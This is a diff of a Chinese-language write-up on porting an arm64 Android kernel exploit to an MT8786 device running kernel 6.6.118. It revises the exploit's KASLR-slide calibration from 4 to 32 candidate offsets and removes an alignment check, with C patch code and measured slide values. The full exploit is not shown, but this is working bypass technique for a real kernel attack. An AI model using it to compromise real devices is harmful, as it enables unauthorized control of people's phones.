@@ -179,14 +179,20 @@ if (g_slide & 0x1fffffULL)
 
 ### 4.1 关键观察：只有 4 种可能
 
-ARM64 的 KASLR 偏移是 `0x80000`（512KB）的倍数，所以
-`slide mod 2MiB` 只可能是：
+> ⚠️ **修订**：下面这段最初写成「只有 4 个候选」，**推断过强，已被上游修正**，见 [kpgc10kai/Shark#6](https://github.com/kpgc10kai/Shark/issues/6)。
+
+arm64 的虚拟 KASLR 位移 = **2 MiB 的随机倍数 + 物理放置 mod 2 MiB**。
+后一项不保证是 512 KiB 的倍数 —— 只受模块对齐约束，通常是 **64 KiB**。
+
+所以正确粒度是 **64 KiB，共 32 个候选**：
 
 ```
-0x000000 / 0x080000 / 0x100000 / 0x180000
+0x00000 / 0x10000 / 0x20000 / ... / 0x1f0000
 ```
 
-**只有 4 个候选。让程序自己试。**
+我们最早用的 4 个值 `{0, 0x80000, 0x100000, 0x180000}` 恰好是这个序列的
+第 **0 / 8 / 16 / 24** 个 —— **能覆盖当时那台机器，但覆盖不了所有物理放置。**
+32 个候选是它的严格超集。
 
 ### 4.2 补丁一：加全局补偿量
 
@@ -209,41 +215,48 @@ if ((site & 0x1fffffULL) != ((TIMER_SITE_LOW21 + g_low_adj) & 0x1fffffULL))
 
 （总共改 3 处：timer ×2、task ×1）
 
-### 4.4 补丁三：校准阶段扫 4 个候选
+### 4.4 补丁三：校准阶段扫 32 个候选（64 KiB 粒度）
 
 ```c
 {
     int c = 0;
-    static const unsigned long long cands[4] = {
-        0ULL, 0x80000ULL, 0x100000ULL, 0x180000ULL};
     int best_ci = 0;
 
-    for (int ci = 0; ci < 4; ci++) {
+    for (int ci = 0; ci < 32; ci++) {
         int cc;
 
-        g_low_adj = cands[ci];
+        g_low_adj = (unsigned long long)ci * 0x10000ULL;
         cc = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
         if (cc > c) { c = cc; best_ci = ci; }
+        if (c >= 512) break;      /* 512 是全中，不可能更好 */
     }
-    g_low_adj = cands[best_ci];
+    g_low_adj = (unsigned long long)best_ci * 0x10000ULL;
     /* 用最终值重新收集，填满 ptrs[] */
     c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
 }
 ```
 
+命中数达到扫描上限时提前退出，所以实际只扫 9 次就停
+（`0x80000` 是序列里第 9 个）。
+
+产物：`artifacts/shark-k66118-32cand`、`artifacts/plant_core.patched.32cand.inc`、`artifacts/make32.py`。
+
 probe 路径同样处理。
 
-### 4.5 补丁四：放宽 2MiB 对齐硬检查
+### 4.5 补丁四：整段删掉 2MiB 对齐硬检查
 
 ```c
 /* 改前 */
 if (g_slide & 0x1fffffULL)
     return 1;
 
-/* 改后：非 2MiB 对齐不再致命 */
-if ((g_slide & 0x1fffffULL) && (g_slide & 0x7ffffULL))
-    return 1;
+/* 改后：整段删除 */
 ```
+
+> ⚠️ **我们最初只把它放宽成 `&& (g_slide & 0x7ffffULL)` —— 那是错的。**
+> 那仍然要求 512 KiB 对齐，会把 64 KiB 粒度的合法位移误杀：
+> 新扫描刚找到正确的 `low_adj`，下一行就主动放弃了。
+> 这个 bug 只有在把粒度从 512 KiB 改到 64 KiB 之后才会暴露。
 
 ---
 
@@ -314,11 +327,15 @@ python patch_shark_low21.py
 
 ### 7.2 什么情况下不成立
 
-| 条件 | slide 对齐 |
+| 情况 | 实际观察 |
 |---|---|
-| `CONFIG_RANDOMIZE_BASE` + 特定 `VA_BITS` / 页大小组合 | 可能 512KB |
-| 我们的设备（MT8786 + 6.6.118 android15-8 + 4K 页） | **512KB** |
-| popsicle（小米 17 Pro Max + 6.12.69） | 2MiB |
+| 正常（2 MiB 对齐） | `slide & 0x1fffff == 0`，老代码可用 |
+| 我们的设备（MT8786 + 6.6.118 android15-8 + 4K 页） | `slide = 0x2b45280000`，`& 0x1fffff = 0x80000` |
+| popsicle（小米 17 Pro Max + 6.12.69） | 2 MiB 对齐 |
+
+> ⚠️ **`0x80000` 是这一次的实测值，不是这台设备的常量。**
+> 位移里含物理放置分量，换一次启动或固件就可能变。
+> 这正是为什么要扫 32 个候选，而不是写死一个值。
 
 ### 7.3 移植任何内核 exploit 时的检查清单
 
